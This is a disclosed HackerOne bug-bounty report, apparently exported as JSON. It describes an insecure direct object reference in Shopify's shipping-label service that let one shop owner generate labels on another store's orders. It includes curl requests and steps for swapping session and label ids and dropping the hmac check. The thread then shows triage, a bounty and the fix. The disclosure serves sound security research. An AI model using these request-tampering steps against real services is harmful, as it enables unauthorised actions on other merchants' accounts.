{"id":884159,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODQxNTk=","url":"https://hackerone.com/reports/884159","title":"Ability to generate shipping labels in another store orders","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2020-05-28T03:49:57.451Z","submitted_at":"2020-05-28T03:49:57.451Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"francisbeaudoin","url":"/francisbeaudoin","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-08-19T17:58:58.924Z","bug_reporter_agreed_on_going_public_at":"2020-08-19T17:58:58.881Z","team_member_agreed_on_going_public_at":"2020-08-18T19:58:10.339Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Details\nA shop owner creating a session on its own store on https://mailbox.shopifycloud.com/ service can craft request to print labels on another store he doesn't have access to.\n\n## Steps to reproduce\n1. Go to an unfulfilled order and click on **Create a shipping label**\n2. Copy the CURL request that is being made to https://mailbox.shopifycloud.com/graphql/labels?sessionId={{sessionId}}. The payload should look like \n```\n curl 'https://mailbox.shopifycloud.com/graphql/labels?sessionId=4e8da4a36b' \\\n  -H 'authority: mailbox.shopifycloud.com' \\\n  -H 'cache-control: max-age=0' \\\n  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \\\n  -H 'content-type: application/json' \\\n  -H 'accept: */*' \\\n  -H 'origin: https://fbeaudoinplus01.myshopify.com' \\\n  -H 'sec-fetch-site: cross-site' \\\n  -H 'sec-fetch-mode: cors' \\\n  -H 'sec-fetch-dest: empty' \\\n  -H 'accept-language: en-US,en;q=0.9' \\\n  --data-binary $'{\"query\":\"mutation PurchaseShippingLabels($shippingLabelPurchaseRequests:[ShippingLabelPurchaseRequestInput\\u0021]\\u0021){purchaseShippingLabels(shippingLabelPurchaseRequests:$shippingLabelPurchaseRequests){shippingLabelId status notices{code severity message shippingLabelId carrierCode serviceCode serviceName __typename}__typename}}\",\"variables\":{\"shippingLabelPurchaseRequests\":[{\"shippingLabelId\":\"gid://shopify/ShippingLabel/522221879427\", \"hmac\": \"5TjRpa34as7d34OPPEhneeu4723=\", \"shippingRateSelection\":{\"carrierCode\":\"canada_post\",\"serviceCode\":\"DOM.EP\",\"serviceName\":\"Expedited Parcel\",\"quotedCost\":{\"amount\":7.91,\"currencyCode\":\"CAD\"},\"shipmentOptions\":[]},\"destinationAddress\":{\"name\":\"Francis Beaudoinn\",\"address1\":\"25-838 Rue Grandjean\",\"address2\":\"\",\"city\":\"Québec\",\"province\":\"QC\",\"postalCode\":\"G1X 3W5\",\"country\":\"CA\",\"phone\":\"\",\"company\":\"\u0026gt;\"},\"weight\":0.00001,\"weightUnit\":\"kg\",\"selectedPackage\":{\"name\":\"Sample box\",\"key\":\"gid://shopify/ShippingPackageV2/46497464451\",\"type\":\"box\",\"length\":35,\"width\":26,\"height\":5,\"dimensionUnit\":\"cm\",\"weight\":0,\"weightUnit\":\"kg\"},\"lineItems\":[{\"lineItemId\":\"gid://shopify/LineItem/4975517728899\",\"quantity\":1}],\"customsLineItems\":[{\"description\":\"test\",\"quantity\":1,\"value\":0,\"weight\":0,\"weightUnit\":\"kg\",\"countryOfOrigin\":\"\",\"provinceOfOrigin\":null,\"hsCode\":\"\",\"inventoryItemId\":null}],\"shippingDate\":\"2020-05-27\",\"customerNotificationDate\":\"2020-05-27\"}]},\"operationName\":\"PurchaseShippingLabels\"}' \\\n  --compressed\n```\n\n3. Void the shipping label\n4. Re-open the order and click again on **Create a shipping label** and take note of the `shipping_label_ids` from the URL\n5. We'll now re-send the request as the attacker, you'll need to use another shop Owner account (different shop). First of, we'll be initiating a session to the service by making the following request. Make sure to update the `{shop}` placeholder in the `Origin` header with your own shop name.\n```\ncurl 'https://mailbox.shopifycloud.com/session/authentication' \\\n  -H 'Connection: keep-alive' \\\n  -H 'Cache-Control: max-age=0' \\\n  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \\\n  -H 'Content-Type: application/json' \\\n  -H 'Accept: */*' \\\n  -H 'Origin: https://{shop}.myshopify.com' \\\n  -H 'Sec-Fetch-Site: cross-site' \\\n  -H 'Sec-Fetch-Mode: cors' \\\n  -H 'Sec-Fetch-Dest: empty' \\\n  -H 'Accept-Language: en-US,en;q=0.9' \\\n  --compressed\n```\nFrom the response payload, copy the `redirectUrl` value and open it up in your browser. Click the install button then you should now be redirected to a page that contains a JSON payload i.e.: `{\"id\": \"abc\", \"status\":\"success\"}`. Take note of the `id` value.\n\n6. From the CURL request in step 2:\n - Change the `gid://shopify/ShippingLabel/` object id with the one from Step 2\n - Change the `sessionId` query parameter to the previous step `id` value. i.e.: `abc`\n - Change the cookie `session` value to the same `id` value. i.e.: `abc`\n - Remove the `hmac` property from the payload\n\n7. Send the CURL request and go back to the order, a new label has been generated.\n\n## Demo\n█████\n\n## Impact\n\nI am not sure of the impact as I didn't make too many tests except the one described here but at least, it demonstrates that an attacker is able to create a session on his own store and make requests to other stores he doesn't have access to.","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":21,"voters":["zzero","svalkanov","drsniper","ali","johndoe1492","teslatheg0d","3x3s","salahhasoneh","footstep","rockybandana","and 11 more..."],"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8125534,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-05-28T03:50:13.195Z","updated_at":"2020-05-28T03:50:13.195Z","additional_data":{"old_title":"Ability to generate shipping labels in another store","new_title":"Ability to generate shipping labels in another store orders"},"actor":{"username":"francisbeaudoin","cleared":false,"url":"/francisbeaudoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8136515,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @francisbeaudoin,\n\nThank you for the report. We've validated this issue and are working on a fix.","automated_response":false,"created_at":"2020-05-28T20:33:46.177Z","updated_at":"2020-05-28T20:33:46.177Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8189793,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @francisbeaudoin,\n\nThanks again for your report. We’re awarding $1000 under the IDOR category for non-core applications. This is towards the low end for this category, as for an attacker to be able to purchase a shipping label for an order, the target merchant must have already begun the shipping label creation process for that particular order.\n\nWe’ll be in touch again once the issue is resolved.","automated_response":false,"created_at":"2020-06-03T13:00:51.812Z","updated_at":"2020-06-03T13:00:51.812Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"francisbeaudoin","url":"/francisbeaudoin"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8233641,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @francisbeaudoin,\n\nWe recently deployed a fix for this issue. For this reason, we will be closing this report as Resolved.\n\nThanks again for another great report! We look forward to hearing from you again soon.","automated_response":false,"created_at":"2020-06-08T14:58:30.945Z","updated_at":"2020-06-08T14:58:30.945Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"francisbeaudoin","url":"/francisbeaudoin"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8516157,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2020-07-06T15:49:37.714Z","updated_at":"2020-07-06T15:49:37.714Z","additional_data":{"added_weaknesses":[{"id":55,"name":"Insecure Direct Object Reference (IDOR)"}],"removed_weaknesses":[]},"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8972402,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-18T19:58:10.370Z","updated_at":"2020-08-18T19:58:10.370Z","first_to_agree":true,"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8981525,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-19T17:58:58.901Z","updated_at":"2020-08-19T17:58:58.901Z","actor":{"username":"francisbeaudoin","cleared":false,"url":"/francisbeaudoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8981526,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-19T17:58:58.953Z","updated_at":"2020-08-19T17:58:58.953Z","actor":{"username":"francisbeaudoin","cleared":false,"url":"/francisbeaudoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}